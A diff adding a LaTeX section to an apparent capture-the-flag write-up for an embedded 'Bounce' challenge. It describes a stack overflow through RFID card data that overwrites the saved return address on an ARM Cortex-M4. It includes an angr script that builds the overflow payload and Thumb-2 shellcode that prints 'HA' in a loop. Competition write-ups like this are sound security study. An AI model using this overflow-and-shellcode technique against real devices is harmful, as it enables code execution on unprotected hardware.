@@ -1,2 +1,66 @@
 \subsection{Bounce}
-Hash: bb8d9065d2656d3ab62ab650b0543fe73844f4df52f5f5d60cc10b31ae6086ac
+\label{sec:bounce}
+
+This challenge was short but different than all of the others.
+The challenge hash not being filled in the challenge function itself. Further investigation revealed that the \texttt{fillChallengeHash} called only during \texttt{setup} would fill and send the hash. This would only happen if the \texttt{use} global boolean was set to true. This boolean was set to true when conditions were met in the actual challenge function.
+
+At first glance, it would seem that calling this function again is impossible, but knowing how return addresses on ARM are saved, we notice that if the right card data is provided, we can overflow the stack with arbitrary data. Using \angr for dynamic analysis, we solved the required input constraints to make \texttt{use = true}. This included control over the saved LR on the stack. Here is the solver script:
+
+\begin{lstlisting}[language=python]
+mgr = self.proj.factory.simgr(st)
+
+mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
+st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
+
+# Returning right towards the fillChallengeHash function
+target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr
+
+print("[+] Exploit target PC %08x" % target_pc)
+
+stage1 = b"\x00"*12 + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)
+
+# clear the white card
+st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
+
+# for each bit that is set, read a byte from the payload (24 bytes)
+st.memory.store(WHITE_CARD_START_ADDR+0x100, b"\xff"*3)
+st.memory.store(WHITE_CARD_START_ADDR+0xc0, stage1)
+
+# Keep buttons symbolic
+st.memory.store(BUTTON_OFFSET, st.solver.BVS('button', 8))
+\end{lstlisting}
+
+\noindent Setting the buttons to a = 0x1, b = 0xd allowed the challenge to be solved.
+
+\paragraph{Arbitrary Code Execution}
+Given that we are able to fully control the instruction pointer, we can redirect it to a controlled space in memory to execute ARM Thumb-2 shellcode. The Cortex-M4 does not have any mitigations (ASLR, XN, MMU, etc.), making this trivial. We jump into the global RFID variable at [0x1fff976d + 0x110] (we just change \texttt{target\_pc} in the \angr script) to start executing the following code:
+
+\begin{lstlisting}[language={[x86masm]Assembler}]
+.section .text
+.align 2
+.syntax unified
+
+adr r7, putchar
+ldrh r7, [r7]
+
+adr r6, hacked
+
+looper:
+  ldrb r0, [r6]
+  blx r7
+  ldrb r0, [r6, #1]
+  blx r7
+
+b looper
+
+; usb_serial_putchar function
+putchar:
+.word 0x3dad
+
+hacked:
+.ascii "HACKED\n"
+\end{lstlisting}
+
+This will print ``HA'' over and over until the watchdog timer resets.
+We ran into many issues getting more code to execute as we believe it was being cut off during the RFID reading process. Hence, HA instead of HACKED.
+\noindent See the Bounce challenge directory for the Makefile.
